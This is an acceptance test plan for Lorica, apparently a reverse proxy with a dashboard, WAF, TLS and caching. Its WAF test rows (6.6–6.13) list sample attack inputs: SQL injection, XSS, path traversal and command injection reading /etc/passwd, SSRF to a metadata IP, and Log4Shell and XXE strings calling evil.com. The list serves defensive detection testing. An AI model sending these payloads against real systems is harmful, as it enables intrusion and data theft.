# Lorica - Acceptance Test Plan

Full scope validation organized by dashboard user flow. Each test maps to an EPIC/Story AC.
Tests are ordered by natural user journey (login -> configure -> monitor -> maintain).

## How to use

- **Status**: [ ] = not tested, [x] = passed, [!] = failed (add note)
- **Method**: Dashboard = browser UI, API = curl/API, Proxy = send traffic, CLI = command line
- Test with `--workers 6` to validate worker mode simultaneously

---

## 0. Installation and Startup

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 0.1 | Install .deb package | CLI | `dpkg -i` succeeds, service enabled | 4.4 |
| 0.2 | Service starts, admin password in journal | CLI | `journalctl -u lorica` shows password | 1.2, 1.4 |
| 0.3 | Binary shows version | CLI | `lorica --version` -> 0.1.3 | 1.2 |
| 0.4 | Data directory created | CLI | `/var/lib/lorica/lorica.db` exists | 1.3 |
| 0.5 | Encryption key created with 0600 perms | CLI | `/var/lib/lorica/encryption.key` exists, `ls -la` shows `-rw-------` | 4.5 |
| 0.6 | Database has 0600 perms | CLI | `ls -la /var/lib/lorica/lorica.db` shows `-rw-------` | 4.5 |
| 0.7 | systemd hardening active | CLI | `systemctl show lorica` shows PrivateTmp, NoNewPrivileges, etc. | 4.5 |
| 0.8 | LimitNOFILE=65536 | CLI | `cat /proc/$(pgrep lorica)/limits` shows 65536 | 4.5 |
| 0.9 | Workers spawned | CLI | `ps aux \| grep lorica` shows 6 worker processes | 2.1 |
| 0.10 | Log socket created | CLI | `/var/lib/lorica/log.sock` exists | - |

## 1. Authentication (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 1.1 | Open dashboard in browser | Dashboard | Login page displayed at `http://localhost:9443` | 1.5 |
| 1.2 | Login with initial admin password | Dashboard | Redirected to "Change Password" screen | 1.4 |
| 1.3 | Change password (weak) | Dashboard | Error: password too short/weak | 1.4 |
| 1.4 | Change password (valid) | Dashboard | Redirected to Overview | 1.4 |
| 1.5 | Login with new password | Dashboard | Overview displayed | 1.4 |
| 1.6 | Login with wrong password | Dashboard | Error message displayed | 1.4 |
| 1.7 | Login rate limiting | API | 5+ failed logins -> 429 Too Many Requests | 4.5 |
| 1.8 | Session cookie is HTTP-only, Secure | API | Inspect Set-Cookie header | 4.5 |
| 1.9 | Session expiry | Dashboard | After idle timeout, redirected to login | 4.5 |
| 1.10 | Logout | Dashboard | Click "Sign out", redirected to login | 1.5 |
| 1.11 | Graceful disconnect on restart | Dashboard | Restart Lorica -> dashboard shows error message, redirects to login (no JSON crash) | - |

## 2. Overview (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 2.1 | Getting started guide visible | Dashboard | Banner with 10 setup steps | - |
| 2.2 | Steps expand/collapse with animation | Dashboard | Click chevron, smooth open/close | - |
| 2.3 | "Go" buttons navigate | Dashboard | Each "Go" navigates to correct page | - |
| 2.4 | "Don't show this again" | Dashboard | Banner dismissed, persisted in localStorage | - |
| 2.5 | Settings toggle re-enables guide | Dashboard | Settings > Preferences > toggle guide on, revisit Overview | - |
| 2.6 | Section helpers ("?" buttons) | Dashboard | Click "?" next to each section title, description appears | - |
| 2.7 | System section shows metrics | Dashboard | Uptime, connections, CPU, memory displayed | 1.9 |
| 2.8 | Routes & Backends section | Dashboard | Route/backend counts, health status colors | 1.6 |
| 2.9 | Auto-refresh (30s) | Dashboard | "Last update" timestamp updates | 1.9 |
| 2.10 | Color logic: orange for 0 routes | Dashboard | 0 routes/backends/certs -> orange | - |
| 2.11 | Color logic: green for healthy | Dashboard | Backends healthy > 0 -> green | - |

## 3. Backends (Dashboard + Proxy)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 3.1 | Create backend | Dashboard | Add backend with address, name, group | 1.6 |
| 3.2 | Health check TCP | Proxy | Backend with reachable port -> healthy (green) | 1.8 |
| 3.3 | Health check HTTP | Proxy | Backend with health_check_path -> healthy if 2xx | 1.8 |
| 3.4 | Health check - degraded | Proxy | Backend with >2s latency -> degraded (orange) | 1.8 |
| 3.5 | Health check - down | Proxy | Backend with unreachable port -> down (red) | 1.8 |
| 3.6 | TLS upstream | Dashboard | Enable tls_upstream, proxy connects via TLS to backend | 1.8 |
| 3.7 | HTTP/2 upstream | Dashboard | Enable h2_upstream, proxy uses h2c/h2 to backend | - |
| 3.8 | Weight | Dashboard | Set weight, observe weighted distribution | 1.8 |
| 3.9 | Edit backend | Dashboard | Change address/weight, verify update | 1.6 |
| 3.10 | Delete backend | Dashboard | Confirm dialog, backend removed | 1.6 |
| 3.11 | Backend lifecycle: drain on removal | Proxy | Remove backend with active connections -> drain (Closing state) | 2.4 |
| 3.12 | EWMA score displayed | Dashboard | EWMA score column shows latency estimate | 4.3 |
| 3.13 | Active connections counter | Dashboard | Active connections visible per backend | 2.4 |
| 3.14 | Search/filter/sort | Dashboard | Search by name/group/address, sort columns | 1.6 |

## 4. Routes (Dashboard + Proxy)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 4.1 | Create route (minimal) | Dashboard | Hostname + backend -> route created | 1.6 |
| 4.2 | Traffic flows through route | Proxy | `curl -H "Host: hostname" http://lorica:8080` -> backend response | 1.8 |
| 4.3 | Path prefix routing | Proxy | Route with /api prefix only matches /api/* | 1.8 |
| 4.4 | Assign TLS certificate | Dashboard | Select cert in route editor, HTTPS works | 1.8 |
| 4.5 | Remove TLS certificate | Dashboard | Deselect cert, save -> certificate_id cleared | - |
| 4.6 | Route drawer: tabs work | Dashboard | Click General/Timeouts/Security/Headers/CORS/Caching/Protection | - |
| 4.7 | Force HTTPS redirect | Proxy | Enable force_https -> HTTP requests get 301 to HTTPS | 6.1 |
| 4.8 | Hostname redirect | Proxy | Set redirect_hostname -> 301 redirect | 6.3 |
| 4.9 | Hostname aliases | Proxy | Add alias, traffic to alias reaches same backend | 6.3 |
| 4.10 | Proxy headers (set) | Proxy | Add custom header, verify backend receives it | 6.1 |
| 4.11 | Proxy headers (remove) | Proxy | Remove header, verify backend doesn't receive it | 6.1 |
| 4.12 | Response headers (set) | Proxy | Add response header, verify client receives it | 6.2 |
| 4.13 | Security header preset (strict) | Proxy | Set "strict" -> HSTS, X-Frame-Options, CSP in response | 6.2 |
| 4.14 | Security header preset (custom) | Dashboard | Create custom preset in Settings, assign to route | 6.2 |
| 4.15 | Path rewrite: strip/add prefix | Proxy | strip_prefix=/api, add_prefix=/v2 -> /api/users -> /v2/users | 6.2 |
| 4.16 | Path rewrite: regex | Proxy | path_rewrite_pattern + replacement with capture groups | - |
| 4.17 | Timeouts (connect/read/send) | Proxy | Set low timeout, slow backend -> timeout error | 6.1 |
| 4.18 | Max request body size | Proxy | Set limit, send large body -> 413 | 6.1 |
| 4.19 | WebSocket passthrough | Proxy | Enable websocket_enabled, WS connection works | 6.1 |
| 4.20 | Access log toggle | Proxy | Disable access_log_enabled, verify no log for this route | 6.2 |
| 4.21 | Per-route compression | Proxy | Enable compression, verify gzip response | - |
| 4.22 | Retry attempts | Proxy | Configure retries, first backend fails -> retry on next | - |
| 4.23 | Load balancing: round-robin | Proxy | Default LB, requests distributed evenly | 1.8 |
| 4.24 | Load balancing: Peak EWMA | Proxy | Select EWMA, requests go to lowest-latency backend | 4.3 |
| 4.25 | Load balancing: consistent hash | Proxy | Select consistent_hash, same client -> same backend | - |
| 4.26 | Load balancing: random | Proxy | Select random, distribution is random | - |
| 4.27 | Topology type per route | Dashboard | Set topology (SingleVM/HA/Custom), health behavior adapts | 3.2 |
| 4.28 | Route enable/disable | Dashboard | Disable route -> 404 for that hostname | 1.6 |
| 4.29 | Delete route | Dashboard | Confirm dialog, route removed | 1.6 |
| 4.30 | Search/filter/sort | Dashboard | Search hostname, sort by health/enabled | 1.6 |
| 4.31 | Nginx import wizard | Dashboard | Paste nginx.conf -> routes/backends/certs created | - |
| 4.32 | Hot-reload on API change | Proxy | Edit route via dashboard -> traffic reflects change without restart | 1.8, 2.2 |

## 5. Certificates (Dashboard + TLS)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 5.1 | Upload PEM certificate | Dashboard | Upload cert+key, issuer/dates/SANs parsed correctly | 1.7 |
| 5.2 | Certificate detail view | Dashboard | Click eye icon -> full metadata, chain, associated routes | 1.7 |
| 5.3 | Expiration thresholds | Dashboard | Gear icon -> configure warning (30d) and critical (7d) thresholds | 1.7 |
| 5.4 | Expiry badge colors | Dashboard | <7d red, <30d orange, >30d green | 1.7 |
| 5.5 | Self-signed generation | Dashboard | Click "Self-signed" -> cert created for domain | 1.7 |
| 5.6 | Self-signed preference memory | Dashboard | "Never/Once/Always" prompt, persisted | 1.7 |
| 5.7 | ACME HTTP-01 provision | Dashboard | Let's Encrypt -> provision via HTTP-01 (port 80 required) | 4.1 |
| 5.8 | ACME DNS-01 automatic | Dashboard | Cloudflare/Route53 provider -> TXT record auto-created | 4.1 |
| 5.9 | ACME DNS-01 manual | Dashboard | Get TXT record info, create manually, confirm | 4.1 |
| 5.10 | ACME staging vs production | Dashboard | Staging checkbox -> test server (no rate limits) | 4.1 |
| 5.11 | Certificate shows ACME flag | Dashboard | is_acme + auto_renew visible in detail | 4.1 |
| 5.12 | Manual renew button | Dashboard | Click renew icon on ACME cert -> renewal triggered | 4.1 |
| 5.13 | Auto-renewal task running | CLI | Wait or check logs for "ACME certificate approaching expiry" | 4.1 |
| 5.14 | Edit certificate (domain rename) | Dashboard | Edit -> change domain name | 1.7 |
| 5.15 | Edit certificate (replace PEM) | Dashboard | Edit -> upload new PEM, metadata re-parsed | 1.7 |
| 5.16 | Delete certificate (no routes) | Dashboard | Delete succeeds | 1.7 |
| 5.17 | Delete certificate (with routes) | Dashboard | Error toast: "certificate is referenced by routes: ..." | 1.7 |
| 5.18 | SNI resolution: exact match | Proxy | Request with SNI=example.com -> correct cert served | 2.3 |
| 5.19 | SNI resolution: wildcard | Proxy | Cert for *.example.com matches sub.example.com | 2.3 |
| 5.20 | SNI resolution: SAN domains | Proxy | Cert with SAN alt names -> all SANs resolve | 2.3 |
| 5.21 | Certificate hot-swap | Proxy | Upload new cert -> active connections keep old cert, new connections get new | 2.3 |
| 5.22 | Private key encrypted at rest | CLI | `sqlite3 lorica.db "SELECT key_pem FROM certificates"` -> binary blob, not PEM text | 4.5 |

## 6. Security (Dashboard + Proxy)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 6.1 | WAF rules listed (28 rules) | Dashboard | Security > Rules tab -> 28 rules displayed | 3.1 |
| 6.2 | WAF rule toggle | Dashboard | Disable/enable individual rule | 3.1 |
| 6.3 | WAF custom rule | Dashboard | Create custom regex rule, verify detection | 3.1 |
| 6.4 | WAF detection mode | Proxy | Route with waf_mode=detection -> SQLi logged but not blocked | 3.1 |
| 6.5 | WAF blocking mode | Proxy | Route with waf_mode=blocking -> SQLi returns 403 | 3.1 |
| 6.6 | WAF: SQL injection | Proxy | `?id=1 UNION SELECT * FROM users` -> detected | 3.1 |
| 6.7 | WAF: XSS | Proxy | `?q=<script>alert(1)</script>` -> detected | 3.1 |
| 6.8 | WAF: Path traversal | Proxy | `/../../../etc/passwd` -> detected | 3.1 |
| 6.9 | WAF: Command injection | Proxy | `; cat /etc/passwd` -> detected | 3.1 |
| 6.10 | WAF: SSRF | Proxy | `?url=http://169.254.169.254/` -> detected | - |
| 6.11 | WAF: Log4Shell | Proxy | `?x=${jndi:ldap://evil.com/a}` -> detected | - |
| 6.12 | WAF: XXE | Proxy | `<!DOCTYPE foo SYSTEM "http://evil.com">` -> detected | - |
| 6.13 | WAF: CRLF | Proxy | `%0d%0aInjected-Header: value` -> detected | - |
| 6.14 | WAF events displayed | Dashboard | Security > Events tab -> events with category/severity | 3.1 |
| 6.15 | WAF events filter by category | Dashboard | Filter dropdown -> only selected category shown | 3.1 |
| 6.16 | WAF stats cards | Dashboard | Events by category, top attack category | 3.1 |
| 6.17 | WAF < 0.5ms latency | API | Prometheus metrics -> WAF evaluation latency < 0.5ms | 3.1 |
| 6.18 | IP blocklist enable | Dashboard | Security > Blocklist toggle ON -> ~80k IPs loaded | - |
| 6.19 | IP blocklist blocks known IP | Proxy | Request from blocklisted IP -> 403 | - |
| 6.20 | IP blocklist refresh | Dashboard | Reload button -> fresh list fetched | - |
| 6.21 | IP blocklist loaded at startup | CLI | Restart with blocklist enabled -> logs show "loaded at startup" | - |
| 6.22 | Rate limiting | Proxy | Send requests > rate_limit_rps -> 429 with Retry-After | 7.2 |
| 6.23 | Rate limit headers | Proxy | Check X-RateLimit-Limit/Remaining/Reset headers | 7.2 |
| 6.24 | Rate limit burst | Proxy | Burst tolerance allows short spikes | 7.2 |
| 6.25 | Auto-ban on repeated 429 | Proxy | Exceed rate limit N times -> 403 (banned) | 7.3 |
| 6.26 | Ban list visible | Dashboard | Security > Bans tab -> banned IPs with expiry | 7.3 |
| 6.27 | Manual unban | Dashboard | Click unban -> IP removed | 7.3 |
| 6.28 | Ban auto-expiry | Proxy | Wait ban_duration_s -> IP automatically unbanned | 7.3 |
| 6.29 | Ban notification | CLI | Check logs for IpBanned notification | 7.3 |
| 6.30 | Slowloris detection | Proxy | Send headers very slowly -> 408 Request Timeout | 7.3 |
| 6.31 | Per-route max connections | Proxy | Set max_connections=2, send 3 concurrent -> 3rd gets 503 | 7.2 |
| 6.32 | Global connection limit | Proxy | Set max_global_connections, exceed -> 503 | 7.3 |
| 6.33 | Flood defense | Proxy | Global RPS > flood_threshold_rps -> per-IP limits halved | 7.3 |
| 6.34 | IP allowlist | Proxy | Set allowlist on route, request from non-allowed IP -> blocked | - |
| 6.35 | IP denylist | Proxy | Set denylist on route, request from denied IP -> blocked | - |
| 6.36 | CORS headers | Proxy | Configure CORS per route, verify Access-Control-* headers | - |

## 7. Caching (Dashboard + Proxy)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 7.1 | Enable cache on route | Dashboard | cache_enabled=true, cache_ttl_s=60 | 7.1 |
| 7.2 | Cache HIT | Proxy | First request MISS, second request HIT (X-Cache header) | 7.1 |
| 7.3 | Cache bypass (Authorization) | Proxy | Request with Authorization header -> BYPASS | 7.1 |
| 7.4 | Cache bypass (Cookie) | Proxy | Request with Cookie header -> BYPASS | 7.1 |
| 7.5 | Cache respects Cache-Control | Proxy | Backend sends Cache-Control: no-cache -> not cached | 7.1 |
| 7.6 | Cache purge | API | `DELETE /api/v1/cache/routes/:id` -> cache cleared | 7.1 |
| 7.7 | Cache stats | Dashboard | Overview shows cache hit rate; API shows hit/miss counts | 7.1 |
| 7.8 | Cache TTL expiry | Proxy | After TTL, next request is MISS again | 7.1 |

## 8. SLA and Performance (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 8.1 | Passive SLA data collected | Dashboard | SLA page shows data after sending traffic | 5.1 |
| 8.2 | SLA percentiles (p50/p95/p99) | Dashboard | Latency percentile tables displayed | 5.1 |
| 8.3 | SLA rolling windows | Dashboard | 1h, 24h, 7d, 30d windows available | 5.1 |
| 8.4 | SLA config per route | Dashboard | Set target SLA %, success criteria | 5.1 |
| 8.5 | SLA breach alert | CLI | Drop SLA below target -> notification dispatched | 5.1 |
| 8.6 | SLA export (CSV/JSON) | Dashboard | Export button -> file downloaded | 5.1 |
| 8.7 | SLA data in Overview | Dashboard | Avg SLA, avg latency, breaches in Performance section | 5.1 |

## 9. Active Probes (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 9.1 | Create probe | Dashboard | Select route, method, path, interval, expected status | 5.2 |
| 9.2 | Probe executes | Dashboard | Probe results appear (latency, success) | 5.2 |
| 9.3 | Enable/disable probe | Dashboard | Toggle probe on/off | 5.2 |
| 9.4 | Active vs passive SLA | Dashboard | Side-by-side comparison on SLA page | 5.2 |
| 9.5 | Delete probe | Dashboard | Probe removed | 5.2 |

## 10. Load Testing (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 10.1 | Create load test config | Dashboard | Set concurrency, RPS, duration, URL | 5.3 |
| 10.2 | Run load test | Dashboard | Real-time SSE progress (latency, throughput, errors) | 5.3 |
| 10.3 | Safe limit confirmation | Dashboard | Exceed safe limits -> confirmation popup | 5.3 |
| 10.4 | Auto-abort on errors | Dashboard | >10% 5xx -> test auto-aborted | 5.3 |
| 10.5 | Abort button | Dashboard | Click abort -> test stopped | 5.3 |
| 10.6 | Historical results | Dashboard | Previous test results listed | 5.3 |
| 10.7 | Clone test config | Dashboard | Clone button -> duplicate config | 5.3 |
| 10.8 | Comparison deltas | Dashboard | Compare two results -> diff displayed | 5.3 |

## 11. Access Logs (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 11.1 | Live log stream | Dashboard | Green pulse indicator, logs appear in real-time | 1.9 |
| 11.2 | Log filtering | Dashboard | Filter by status code, route | 1.9 |
| 11.3 | Log entries show details | Dashboard | Method, path, status, latency, backend, client IP | 1.8 |
| 11.4 | WebSocket streaming | Dashboard | Logs stream via WebSocket (not polling) | 1.9 |
| 11.5 | Worker mode logs forwarded | Dashboard | In worker mode, all workers' logs visible in supervisor | - |

## 12. System (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 12.1 | Version displayed | Dashboard | System page shows Lorica version | 1.9 |
| 12.2 | Uptime displayed | Dashboard | Correct uptime shown | 1.9 |
| 12.3 | CPU/Memory/Disk gauges | Dashboard | Host resource gauges with color thresholds | 1.9 |
| 12.4 | Process memory and CPU | Dashboard | Lorica process metrics displayed | 1.9 |
| 12.5 | Worker table (PIDs) | Dashboard | Workers with real PIDs (not 0) | 2.1 |
| 12.6 | Worker health status | Dashboard | Healthy/Unresponsive with dot indicator | 2.1 |
| 12.7 | Worker heartbeat latency | Dashboard | Heartbeat latency in ms | 2.2 |
| 12.8 | Auto-refresh (5s) | Dashboard | Metrics update automatically | 1.9 |

## 13. Settings (Dashboard)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 13.1 | Global settings | Dashboard | View/edit management port, flood threshold, max connections, topology | 1.10 |
| 13.2 | Notification channel: SMTP | Dashboard | Configure email channel, test button | 3.3 |
| 13.3 | Notification channel: Webhook | Dashboard | Configure webhook URL, test button | 3.3 |
| 13.4 | Notification test | Dashboard | Click "Test" -> notification dispatched | 3.3 |
| 13.5 | Alert type filtering | Dashboard | Enable/disable per alert type | 3.3 |
| 13.6 | Security header presets | Dashboard | View builtins (strict/moderate/none), create custom | 6.2 |
| 13.7 | Preference memory | Dashboard | Stored preferences listed with delete option | 1.10 |
| 13.8 | Getting started guide toggle | Dashboard | Toggle helper guide visibility | - |
| 13.9 | Config export (TOML) | Dashboard | Download button -> TOML file | 1.10 |
| 13.10 | Config import with diff | Dashboard | Upload TOML, preview diff, apply | 1.10 |
| 13.11 | Theme toggle (light/dark) | Dashboard | Switch theme, persisted across sessions | 1.5 |

## 14. Prometheus Metrics

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 14.1 | /metrics endpoint | API | `curl localhost:9443/metrics` -> Prometheus format | 4.2 |
| 14.2 | Request count by route/status | API | `lorica_requests_total{route_id, status_code}` | 4.2 |
| 14.3 | Latency histogram | API | `lorica_request_duration_seconds_bucket` | 4.2 |
| 14.4 | Active connections gauge | API | `lorica_active_connections` | 4.2 |
| 14.5 | Backend health gauge | API | `lorica_backend_healthy` | 4.2 |
| 14.6 | Certificate expiry days | API | `lorica_certificate_expiry_days` | 4.2 |
| 14.7 | WAF events counter | API | `lorica_waf_events_total{category, action}` | 4.2 |
| 14.8 | System CPU/memory | API | `lorica_cpu_usage`, `lorica_memory_bytes` | 4.2 |

## 15. Notifications

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 15.1 | cert_expiring notification | CLI | Cert approaching expiry -> stdout log | 3.3 |
| 15.2 | backend_down notification | CLI | Backend becomes unreachable -> notification | 3.3 |
| 15.3 | waf_alert notification | CLI | WAF event in blocking mode -> notification | 3.3 |
| 15.4 | config_changed notification | CLI | Route/backend modified -> notification | 3.3 |
| 15.5 | ip_banned notification | CLI | IP auto-banned -> notification | 7.3 |
| 15.6 | sla_breached notification | CLI | SLA below target -> notification | 5.1 |
| 15.7 | Notification rate limiting | CLI | Burst of events -> rate limited (10/60s default) | 3.3 |

## 16. Worker Mode Specifics

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 16.1 | Config reload propagated | Proxy | Edit route -> all workers pick up change | 2.2 |
| 16.2 | Worker crash + restart | CLI | `kill -9` one worker -> auto-restart within 1s | 2.1 |
| 16.3 | Graceful shutdown | CLI | `systemctl stop lorica` -> 30s drain, then clean stop | 2.1 |
| 16.4 | SLA metrics from workers | Dashboard | SLA data appears in worker mode | - |
| 16.5 | Heartbeat monitoring | Dashboard | Workers show heartbeat latency <100ms | 2.2 |
| 16.6 | SO_REUSEPORT active | CLI | `ss -tlnp` shows multiple processes on same port | - |

## 17. Service Discovery (Optional Features)

| # | Test | Method | Expected | Story |
|---|------|--------|----------|-------|
| 17.1 | Docker Swarm discovery | API | With `docker` feature, backends auto-discovered from Swarm | 3.2 |
| 17.2 | Kubernetes discovery | API | With `kubernetes` feature, pods auto-discovered | 3.2 |

---

**Total: 190+ test cases across 17 sections**

Last updated: 2026-04-03
